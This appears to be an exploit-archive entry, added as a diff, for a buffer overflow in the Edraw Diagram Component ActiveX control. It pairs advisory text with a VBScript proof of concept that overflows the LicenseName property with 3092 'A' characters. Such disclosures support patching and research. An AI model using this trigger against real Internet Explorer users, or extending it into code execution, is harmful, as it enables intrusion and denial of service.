@@ -1,0 +1,20 @@
+source: http://www.securityfocus.com/bid/51866/info
+
+Edraw Diagram Component ActiveX control ('EDBoard.ocx') is prone to a remote buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+An attacker can exploit this issue to execute arbitrary code in the context of the application, usually Internet Explorer, using the ActiveX control. Failed attacks will likely cause denial-of-service conditions.
+
+Edraw Diagram Component 5 is vulnerable; other versions may also be affected. 
+
+Author : Senator of Pirates
+This exploit tested on Windows Xp SP3 EN
+http://www.edrawsoft.com/download/EDBoardSetup.exe
+--------------------------------------------------------------------------------------------------------
+<object
+classid='clsid:6116A7EC-B914-4CCE-B186-66E0EE7067CF' id='target' /> <script language='vbscript'>targetFile = "C:\Program Files\edboard\EDBoard.ocx"
+prototype  = "Invoke_Unknown LicenseName As String"
+memberName = "LicenseName"
+progid     = "EDBoardLib.EDBoard"
+argCount   = 1
+arg1=String(3092, "A")
+target.LicenseName = arg1</script>
